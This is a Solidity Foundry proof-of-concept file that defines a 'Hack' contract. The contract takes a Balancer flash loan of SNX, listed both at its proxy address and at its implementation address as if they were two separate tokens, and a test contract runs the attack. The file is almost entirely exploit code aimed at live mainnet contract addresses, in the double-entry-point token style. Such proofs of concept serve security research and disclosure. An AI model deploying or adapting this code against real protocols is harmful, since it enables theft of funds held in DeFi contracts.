pragma solidity 0.8.12;

import "ds-test/test.sol";
import "forge-std/stdlib.sol";
import "forge-std/Vm.sol";


contract BalancerAddr is DSTest, stdCheats {
    address public constant vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public constant feeCollector = 0xce88686553686DA562CE7Cea497CE749DA109f9F;

    address public constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address public constant SNX_IMPL = 0x931933807c4c808657b6016f9e539486e7B5d374;
}
interface ERC20Like {
    function balanceOf(address _owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
    function approve(address,uint) external;
}
interface BalancerFlashLoanLike {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}
contract Hack is BalancerAddr {
    constructor() {

    }
    ///ESAY WAY, no complicate, bubble sort
    function sortTokens(address[] memory tokens) public returns (address[] memory) {
        for (uint256 i = 0; i < tokens.length; ++i) {
            for (uint256 j = i + 1; j < tokens.length; ++j) {
                if (tokens[i] > tokens[j]) {
                    address temp = tokens[i];
                    tokens[i] = tokens[j];
                    tokens[j] = temp;
                }
            }
        }
        return tokens;
    }
    function start() public {
        address[] memory tokens = new address[](2);
        tokens[0] = SNX;
        tokens[1] = SNX_IMPL;

        tokens = sortTokens(tokens);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 99 ether;
        amounts[1] = 1 ether;

        BalancerFlashLoanLike(vault).flashLoan(
            address(this),
            tokens,
            amounts,
            ""
        );
    }
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        //do something
        ERC20Like(SNX).transfer(vault, 100 ether);
    }
    
}

contract POC is BalancerAddr {
    Vm public vm = Vm(HEVM_ADDRESS);
    Hack public hack;

    function setUp() public {
        hack = new Hack();
    }
    function test_Start() public {
        hack.start();
    }
}


